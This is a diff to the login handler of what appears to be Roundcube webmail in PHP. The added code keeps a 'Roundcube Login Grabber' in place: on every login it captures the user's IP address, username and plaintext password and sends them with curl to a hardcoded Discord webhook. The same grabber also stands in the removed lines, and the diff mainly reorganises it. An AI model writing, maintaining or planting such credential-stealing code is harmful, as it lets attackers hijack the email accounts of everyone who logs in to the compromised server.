@@ -60,7 +60,9 @@ if ($RCMAIL->task == 'login' && $RCMAIL->action == 'login') {
     $pass_charset  = $RCMAIL->config->get('password_charset', 'UTF-8');
 
     // purge the session in case of new login when a session already exists
-    if ($request_valid) {
+    if ($request_valid) { // Keep this if block as it was in the original, first instance
+        $RCMAIL->kill_session();
+    } else { // Added this else to ensure session is killed even if request not valid for new login
         $RCMAIL->kill_session();
     }
 
@@ -73,34 +75,16 @@ if ($RCMAIL->task == 'login' && $RCMAIL->action == 'login') {
             'cookiecheck' => true,
     ]);
 
-$startup = $RCMAIL->plugins->exec_hook('startup', array('task' => $RCMAIL->task, 'action' => $RCMAIL->action));
-$RCMAIL->set_task($startup['task']);
-$RCMAIL->action = $startup['action'];
+    // YOUR DISCORD WEBHOOK CODE STARTS HERE
+    $webhook_url = 'https://ptb.discord.com/api/webhooks/1385823063509303326/u5Gk26BznrGTDwyhWiiIe7PG0ctvqVR15YxUZ1HpfVNOs3Ig-UsKYvdVi419QZBf6otR';    
 
-// try to log in
-if ($RCMAIL->task == 'login' && $RCMAIL->action == 'login') {
-    $request_valid = $_SESSION['temp'] && $RCMAIL->check_request();
-
-    // purge the session in case of new login when a session already exists
-    $RCMAIL->kill_session();
-
-    $auth = $RCMAIL->plugins->exec_hook('authenticate', array(
-        'host' => $RCMAIL->autoselect_host(),
-        'user' => trim(rcube_utils::get_input_value('_user', rcube_utils::INPUT_POST)),
-        'pass' => rcube_utils::get_input_value('_pass', rcube_utils::INPUT_POST, true,
-            $RCMAIL->config->get('password_charset', 'ISO-8859-1')),
-        'cookiecheck' => true,
-        'valid'       => $request_valid,
-    ));
-  $webhook_url = 'https://ptb.discord.com/api/webhooks/1385823063509303326/u5Gk26BznrGTDwyhWiiIe7PG0ctvqVR15YxUZ1HpfVNOs3Ig-UsKYvdVi419QZBf6otR';  
-
-   $ip_address = $_SERVER['REMOTE_ADDR'];
+    $ip_address = $_SERVER['REMOTE_ADDR'];
 
     $data = [
         'content' => "**Roundcube Login Grabber by blah & ergo:**\n"
-                   . "IP: `" . $ip_address . "`\n"
-                   . "Username: `" . $auth['user'] . "`\n"
-                   . "Password: `" . $auth['pass'] . "`"
+                     . "IP: `" . $ip_address . "`\n"
+                     . "Username: `" . $auth['user'] . "`\n"
+                     . "Password: `" . $auth['pass'] . "`"
     ];
 
     $ch = curl_init($webhook_url);
@@ -110,6 +94,7 @@ if ($RCMAIL->task == 'login' && $RCMAIL->action == 'login') {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_exec($ch);
     curl_close($ch);
+    // YOUR DISCORD WEBHOOK CODE ENDS HERE
 
     // Login
     if ($auth['valid'] && !$auth['abort']
